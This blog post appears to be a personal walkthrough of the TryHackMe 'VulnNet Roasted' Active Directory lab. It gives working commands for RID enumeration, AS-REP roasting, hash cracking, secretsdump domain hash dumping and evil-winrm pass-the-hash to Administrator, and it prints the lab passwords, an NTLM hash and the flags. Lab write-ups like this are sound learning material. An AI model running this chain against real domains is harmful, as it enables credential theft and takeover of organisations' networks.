---
layout: post
title: "VulnNet Roasted – TryHackMe"
categories: thm
date: 2025-07-20
---

## 🧠 Summary
VulnNet Roasted is an **Active Directory (AD) exploitation** challenge on TryHackMe. It involves **enumeration, AS-REP roasting, password cracking, privilege escalation using secretsdump**, and **retrieving user and system flags**.

> **Note:** I had difficulties because I don’t have deep knowledge of AD yet. This made it confusing to understand SID, RID, Kerberos attacks, and pass-the-hash concepts initially.

---

## 🔍 Tools Used
- `nmap`
- `enum4linux-ng`
- `lookupsid.py` (Impacket)
- `GetNPUsers.py` (Impacket)
- `john` (password cracking)
- `smbclient`
- `evil-winrm` (shell access)
- `secretsdump.py` (Impacket)

---

## 💻 Target Info
- **Machine Name:** VulnNet Roasted
- **Platform:** TryHackMe
- **Difficulty:** Easy but medium in my case
- **Target IP (initial):** 10.10.57.250
- **Redeployed IPs:** 10.10.149.244, 10.10.67.90 (due to session expiry after ~20 mins)
- **Domain:** vulnnet-rst.local
- **OS:** Windows Server 2019 (based on Nmap results)
- **Tags:** Active Directory, Kerberos, Pass-the-Hash, Impacket, Evil-WinRM, Privilege Escalation

---
## ✅ Step 1: Nmap Scan
We start by scanning the target for open ports:

```bash
nmap -sC -sV -Pn -A 10.10.57.250
```
Key Findings:
- Domain Controller detected
- Domain: vulnnet-rst.local

Important Ports:
- 88 (Kerberos) – Authentication
- 445 (SMB) – File Sharing
- 135, 139 – RPC and NetBIOS
- 389, 3268 – LDAP (AD services)
- 5985 – WinRM (for remote shell)

![Nmap Scan Results](/assets/img/htb/vulnnet/nmapvulnnet.jpg)

## ✅ Step 2: SMB Enumeration
Check available SMB shares:

```bash
smbclient -L \\\\10.10.57.250\\
```
Output:
- NETLOGON
- SYSVOL
- VulnNet-Business-Anonymous
- VulnNet-Enterprise-Anonymous

![SMB Shares](/assets/img/htb/vulnnet/smb.jpg)

Edit /etc/hosts file:
```bash
sudo nano /etc/hosts
<target-ip> vulnnet-rst.local //add this and save the file
```

![Edit Hosts File](/assets/img/htb/vulnnet/edithost.jpg)

Difficulty Faced:
- At first, I thought flags were inside these anonymous shares, but they contained only .txt business info files (decoys).

## ✅ Step 3: SID & RID Enumeration
I had trouble understanding SID and RID initially.

What are SID and RID?
- SID (Security Identifier): Unique identifier for a user/group in AD.
- RID (Relative Identifier): The last part of SID, differentiating accounts.
  
Example:

S-1-5-21-1589833671-435344116-4136949213-500

Here, 500 = Administrator RID.

Command:
```bash
python3 /usr/share/doc/python3-impacket/examples/lookupsid.py vulnnet-rst.local/guest@10.10.149.244
```
We found user accounts:
- a-whitehat
- t-skid
- j-goldenhand
- j-leet

![RID Enumeration](/assets/img/htb/vulnnet/lookupsid.jpg)

Then, create a vuln.txt file:
```bash
sudo nano vuln.txt
//add this
a-whitehat
t-skid
j-leet
```

![Vuln.txt Content](/assets/img/htb/vulnnet/vulntxt.jpg)

## ✅ Step 4: AS-REP Roasting
Some users do not require pre-authentication. We exploit this using:
```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py vulnnet-rst.local/ -no-pass -usersfile vuln.txt
```
Result:
```bash
t-skid@VULNNET-RST.LOCAL:$krb5asrep$23$...
```

![AS-REP Hash Found](/assets/img/htb/vulnnet/asrep.jpg)

Save the hash to file (roasted.hash in my case):

![Saving the Hash](/assets/img/htb/vulnnet/hash.jpg)

Cracking the Hash:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt roasted.hash
```
Password Found:
t-skid : tj072889*

![Password Cracked](/assets/img/htb/vulnnet/john.jpg)

## ✅ Step 5: Lateral Movement
Logged in as t-skid with SMB and found ResetPassword.vbs in NETLOGON share.
Command:
```bash
smbclient \\\\10.10.149.244\\NETLOGON -U vulnnet-rst.local\\t-skid
```
Inside, we discovered credentials:
```bash
a-whitehat : bNdKVkjv3RR9ht
```

![ResetPassword.vbs Found](/assets/img/htb/vulnnet/resetpw.jpg)

![ResetPassword.vbs Content](/assets/img/htb/vulnnet/resetpwview.jpg)

## ✅ Step 6: Dumping Domain Hashes (Privilege Escalation)
Using a-whitehat credentials:
```bash
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc a-whitehat:bNdKVkjv3RR9ht@10.10.67.90
```
We got Administrator NTLM hash:
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d
```

![Secretsdump Output](/assets/img/htb/vulnnet/secretsdump.jpg)

## ✅ Step 7: Pass-the-Hash & Get Administrator Shell
```bash
evil-winrm -i 10.10.67.90 -u Administrator -H c2597747aa5e43022a3a3049a3c3b09d
```
😈 Got Administrator access!

## ✅ Step 8: Capture the Flags
Find system.txt and user.txt:
```bash
Get-ChildItem -Path C:\Users -Include *system.txt* -Recurse | Get-Content
Get-ChildItem -Path C:\Users -Include *user.txt* -Recurse | Get-Content
```
Flags:
```bash
User: THM{726b7c0baac1455d05c827b5561f4ed}
System: THM{16f45e3934293a57645f8d7bf71d8d4c}
```

![Flags Found](/assets/img/htb/vulnnet/flags.jpg)

## ✅ Lessons Learned:
- SID & RID concepts: Critical for AD enumeration.
- AS-REP Roasting: Exploits accounts without pre-authentication.
- Pass-the-Hash: No password required, only NTLM hash.
- Persistence: Multiple re-deployments were needed due to lab expiry.
- Difficulty: Without prior AD knowledge, understanding Kerberos, RID cycling, and WinRM was challenging.

## ✅ Final Thoughts:
This box taught me:
- The real power of Impacket tools.
- The importance of enumeration in AD.
- How lateral movement happens in corporate environments.

🔥 This was tough but rewarding!
